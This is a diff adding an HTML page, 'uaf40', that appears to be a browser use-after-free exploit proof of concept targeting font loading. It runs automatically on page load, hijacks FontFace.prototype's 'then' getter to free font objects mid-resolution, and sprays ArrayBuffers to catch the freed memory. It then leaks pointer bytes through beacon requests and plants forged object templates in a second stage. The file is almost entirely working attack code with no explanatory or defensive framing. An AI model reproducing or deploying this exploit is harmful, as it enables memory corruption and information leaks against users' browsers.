@@ -1,0 +1,76 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>uaf40</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(u,o){var s='';for(var i=0;i<8;i++){s+=('0'+u[o+i].toString(16)).slice(-2)}return s}
+var U = Date.now().toString(36);
+var SIZES = [192,224,256,320,384,512,768,1024,2048];
+var K = 8, stage = 0, styleEl = null, MAP = [], HIT = null, hitSize = 0;
+function mkFace(tag){
+  var fam = 's'+U+'x'+tag, nm = 'f'+U+'x'+tag;
+  styleEl = document.createElement('style');
+  styleEl.textContent = "@font-face { font-family: "+fam+"; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  var A = new FontFace(nm, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  (window.__alive = window.__alive || []).push(A);
+  return fam;
+}
+function spray(){
+  MAP = [];
+  for (var si=0; si<SIZES.length; si++)
+    for (var k=0;k<K;k++){
+      var ab = new ArrayBuffer(SIZES[si]);
+      MAP.push({ size: SIZES[si], view: new Uint8Array(ab) });
+    }
+}
+function findHit(){
+  for (var i=0;i<MAP.length;i++){
+    var u=MAP[i].view, nz=0;
+    for (var o=0;o<u.length;o+=8){ if (u[o]||u[o+1]||u[o+2]||u[o+3]||u[o+4]||u[o+5]||u[o+6]||u[o+7]) nz++; }
+    if (nz){ HIT=u; hitSize=MAP[i].size; return i; }
+  }
+  return -1;
+}
+function startStage(tag){
+  stage = tag;
+  b('U40-ST'+tag+'-START');
+  var fam = mkFace(tag);
+  document.fonts.load('1em f'+U+'x'+tag+', '+fam, 'AB').then(function(){
+    b('U40-ST'+tag+'-RESOLVED');
+    if (tag===1) setTimeout(function(){ if (HIT) startStage(2); else b('U40-ABORT-NOHIT'); },40);
+  }, function(){ b('U40-ST'+tag+'-REJECTED'); });
+}
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function(){
+    if (stage===0) return undefined;
+    var st = stage; stage = 0;
+    if (styleEl) { styleEl.remove(); styleEl.textContent = ''; styleEl = null; }
+    try { document.fonts.delete(this); } catch (e) {}
+    document.body.offsetHeight;
+    spray();
+    if (st===1){
+      try { document.fonts.check('1em s'+U+'x1'); } catch (e) {}
+      var i = findHit();
+      if (i<0){ b('U40-ST1-NOHIT-'+MAP.length); return undefined; }
+      b('U40-ST1-HIT-s'+hitSize+'-b'+i+'-0:'+hex8(HIT,0)+'-58:'+hex8(HIT,0x58)+'-68:'+hex8(HIT,0x68));
+      return undefined;
+    }
+    for (var j=0;j<MAP.length;j++){
+      var u=MAP[j].view;
+      u[0]=1;
+      u.set(HIT.subarray(0x58,0x60),0x58);
+      u.set(HIT.subarray(0x68,0x70),0x68);
+    }
+    b('U40-ST2-TEMPLATE');
+    try { document.fonts.check('1em s'+U+'x2'); } catch (e) {}
+    b('U40-ST2-CHECK-RETURNED');
+    return undefined;
+  },
+  set: function(){}
+});
+function run(){ b('U40-PARSE-'+U); startStage(1); }
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></head><body><p>uaf40</p></body></html>
